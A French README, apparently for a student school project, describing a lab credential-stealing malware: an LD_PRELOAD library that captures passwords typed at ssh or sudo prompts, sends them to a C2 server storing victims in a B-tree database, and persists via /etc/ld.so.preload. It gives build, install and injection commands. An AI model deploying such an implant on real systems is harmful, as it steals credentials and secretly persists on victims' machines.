Slimani Anis et ANGELOV Onur 3SIJ

# 🛡️ Projet C2 Malware LD_PRELOAD – ESGI CC1

Projet réparti sur 2 VMs simulant une attaque malware avec injection via `LD_PRELOAD`, exfiltration de mot de passe, et stockage dans une base BTree persistante.

---

## 📁 Structure du projet

CC1-DATABASE-ESGI/
├── server/
│ ├── server.c
│ ├── register_victim.c
│ ├── Makefile
│ └── ...
├── BTreeDB/
│ ├── author.md
│ ├── btree.c/.h/.o
│ ├── table.c/.h/.o
│ ├── repl.c/.h/.o
│ ├── persistence.c/.h/.o
│ ├── main.c/.o
│ ├── database.db # base des victims
│ ├── id_counter.txt # ID auto-incrémenté
│ ├── db.txt, db/, tests/
│ ├── Makefile, README.md
│ └── BTreeProject/
├── LD_PRELOAD/malware/
│ ├── malware.c
│ ├── send_to_c2.c
│ ├── malware.so
│ ├── Makefile
│ └── install_ldso_preload.sh
└── README.md

---

## 💻 VM 1 – Serveur C2 (192.168.1.20)

### 🛠️ Prérequis

- OpenSSH installé :

  sudo apt install openssh-server
🔧 Compilation du serveur + base

cd ~/server/CC1-DATABASE-ESGI/server
make clean
make
🚀 Lancer le serveur C2

./server
Le serveur écoute sur le port 5555
Il reçoit :

register <hostname> <password> → stocké dans la base BTree

log <hostname> <cmd> → affiché dans le terminal

💻 VM 2 – Malware (192.168.1.15)
🛠️ Prérequis
OpenSSH installé :

sudo apt install openssh-server
⚠️ Configuration du malware
Dans send_to_c2.c, modifier l’IP du serveur (ligne #define C2_IP "...") :


#define C2_IP "192.168.1.20"
#define C2_PORT 5555
Tu peux aussi modifier le port C2 si nécessaire.

🔧 Compilation

cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware
make
🐚 Injection automatique via LD_PRELOAD

chmod +x install_ldso_preload.sh
sudo ./install_ldso_preload.sh
Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload


| Fonction                         | Description                                                                                                                                               |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 🔑 Exfiltration de mot de passe  | Intercepte les entrées `password:` dans un terminal                                                                                                       |
| 📦 Envoi vers serveur C2         | Format : `register <hostname> <mdp>`                                                                                                                      |
| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué |

| 🧠 Injection automatique via SSH | Tu peux tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                               |
| 💾 Persistance dans BTree        | Chaque victime est stockée dans `database.db` avec ID unique                                                                                              |
| 🔁 Injection persistante         | Automatique via `/etc/ld.so.preload`                                                                                   

🔍 Vérification de la base
Sur la VM C2 :

cd ../BTreeDB
./db
Dans la CLI :


select
Tu verras (le register el le mdp de la connexion ssh):
ex
(1, anisdebian, 1478)
(2, onur, 1234)

🧪 Exemple de test
Lancer le serveur C2 sur VM1 :
./server


Sur la VM malware, compiler et injecter :


make
chmod +x install_ldso_preload.sh
sudo ./install_ldso_preload.sh
Se connecter à une machine distante via SSH (ou exécuter sudo ls)
exemple :
LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)


→ password: sera intercepté sur le serverc2
Vérifier la base côté serveur :

cd ../BTreeDB
./db
> select (pour parcourir l'arbre et voir ceux qui est insert)
autre commande expliqué dans la db


❌ Pour désactiver le malware

sudo rm /etc/ld.so.preload
📎 Remarques
Le fichier database.db est mis à jour automatiquement.


